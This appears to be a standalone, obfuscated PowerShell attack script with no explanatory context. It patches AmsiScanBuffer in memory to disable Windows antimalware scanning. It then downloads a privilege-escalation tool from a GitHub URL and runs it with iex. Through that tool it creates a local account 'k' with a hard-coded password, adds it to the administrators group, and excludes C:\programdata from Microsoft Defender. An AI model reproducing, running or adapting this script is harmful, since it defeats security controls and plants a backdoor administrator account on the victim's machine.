$Cygm = @"
using System;
using System.Runtime.InteropServices;
public class Cygm {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr NK1s, string UUuhMpo4EzbAp8);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr m2NBeZUska, UIntPtr IWL, uint udF4s6RSeUg, out uint q8S7YQ9FOiBt5cVtG);
}
"@

Add-Type $Cygm

$ZaSnbGwJ0b5Qd2 = [Cygm]::LoadLibrary("$(('âm'+'sì'+'.d'+'ll').nOrMaLizE([CHAR]([BYTE]0x46)+[ChaR](111*8/8)+[Char](77+37)+[cHar]([ByTE]0x6d)+[Char](68+23-23)) -replace [cHar](92*34/34)+[chaR](112)+[CHaR](123+108-108)+[cHaR](77*21/21)+[CHaR](110)+[cHAr](60+65))")
$XtzBb9Uw = [Cygm]::GetProcAddress($ZaSnbGwJ0b5Qd2, "$([chAR]([bytE]0x41)+[ChaR](72+37)+[char](115*93/93)+[cHar](105)+[char]([byTE]0x53)+[cHAr]([ByTe]0x63)+[cHAr](97*66/66)+[chAR](31+79)+[CHAr]([BYTe]0x42)+[cHar]([BYte]0x75)+[cHAR]([Byte]0x66)+[CHAr](102)+[CHar](101)+[cHaR]([bYTE]0x72))")
$p = 0
[Cygm]::VirtualProtect($XtzBb9Uw, [uint32]5, 0x40, [ref]$p)
$TLO7AbkLF5Bu = "0xB8"
$k8z_Kg9VMi7SE = "0x57"
$MTZ = "0x00"
$H5XY = "0x07"
$E2mbIHV7bn = "0x80"
$feYIQ71lwx_8c = "0xC3"
$Y6njVZB07L0DlEn0YBbm = [Byte[]] ($TLO7AbkLF5Bu,$k8z_Kg9VMi7SE,$MTZ,$H5XY,+$E2mbIHV7bn,+$feYIQ71lwx_8c)
[System.Runtime.InteropServices.Marshal]::Copy($Y6njVZB07L0DlEn0YBbm, 0, $XtzBb9Uw, 6)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"


















